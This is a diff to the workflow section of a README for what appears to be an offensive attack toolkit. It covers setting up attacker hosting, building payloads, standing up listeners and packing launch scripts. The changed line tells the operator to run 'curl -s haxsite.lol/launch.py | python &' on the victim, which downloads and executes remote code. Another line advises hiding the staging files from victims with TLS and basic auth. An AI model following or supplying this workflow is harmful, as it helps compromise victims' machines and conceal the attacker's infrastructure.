@@ -42,7 +42,7 @@ Most of this code has been cobbled together, duct tape and bailing wire style (d
 
 ## WORKFLOW:
 ------
-  buy hosting/vm -> setup webserver/letsencrypt/basicauth/etc -> upload files -> create all your payloads -> stand up your listeners -> edit launch.sh and cups.sh -> pack .sh files -> upload -> launch using **curl -s haxsite.lol/launch.py | python &**
+  buy hosting/vm -> setup webserver/letsencrypt/basicauth/etc -> create all your payloads -> stand up your listeners -> edit launch.sh and cups.sh -> pack .sh files -> upload to your site/vm/etc -> launch on victim using **curl -s haxsite.lol/launch.py | python &**
 
 You may also want to drop the gallery files into place somewhere so you can upload them. It is **STRONGLY ADVISABLE** to use letsencrypt and apache/nginx basic auth so that your victims can't just stumble across your files, and that you aren't transmitting things in the clear.
 
